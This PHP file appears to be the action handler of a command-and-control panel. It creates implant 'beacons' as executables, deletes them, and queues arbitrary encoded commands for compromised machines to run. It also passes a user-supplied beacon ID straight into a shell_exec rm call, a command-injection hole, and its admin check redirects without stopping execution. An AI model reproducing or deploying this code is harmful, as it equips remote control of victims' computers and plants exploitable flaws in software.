<?php
// Initialize the session
session_start();
// Check if user is an Admin
if($_SESSION["role"] != 1)
{
    header("Location: /panel");
}
else
{
    header("location: /users");
}

// Connect to the DB
include_once root . "/logic/native/dbconnect.php";

// Check the action type
if($_POST["action"] == "create")
{
    
    // Include the beacon template
    include_once root . "/logic/beacons/beacon_template.php";

    // Set parameters
    $beacon_id = md5(rand());
    beacon_create($beacon_id);

    // Prepare an insert statement
    $sql = "INSERT INTO beacons (beacon_id) VALUES (:beacon_id)";
    if($stmt = $conn->prepare($sql))
    {
        // Bind variables to the prepared statement as parameters
        $stmt->bindParam(":beacon_id", $beacon_id, PDO::PARAM_STR);
           
        
            
        // Attempt to execute the prepared statement
        if($stmt->execute())
        {
            echo 1;
        } 
        // Close statement
        unset($stmt);
        

    }

}
elseif($_POST["action"] == "delete")
{
    // Prepare delete statement
    $sql = "DELETE from beacons where beacon_id= :beacon_id";
         
    $stmt = $conn->prepare($sql);
    
    // Bind variables to the prepared statement as parameters
    $stmt->bindParam(":beacon_id", $_POST['beacon_id'], PDO::PARAM_STR);

    // Attempt to execute the prepared statement
    $stmt->execute();

    // Close statement
    unset($stmt);

    shell_exec('/usr/bin/rm ' . $_POST['beacon_id'] . ".exe");

    // Redirect to panel
    header("location: /panel");
}
elseif($_POST["action"] == "command")
{
    // Prepare the update statement
    $sql = "UPDATE beacons SET command = :command WHERE beacon_id = :beacon_id";

    $command = base64_encode($_POST["command"]);
    $stmt = $conn->prepare($sql);
    // Bind variables to the prepared statement as parameters
    $stmt->bindParam(":beacon_id", $_POST["beacon_id"], PDO::PARAM_STR);
    $stmt->bindParam(":command", $command, PDO::PARAM_STR);
    

    // Attempt to execute the prepared statement
    $stmt->execute();

    // Redirect to panel
    header("location: /panel");
}

// Close the DB connection 
require_once root . "/logic/native/dbclose.php";
    

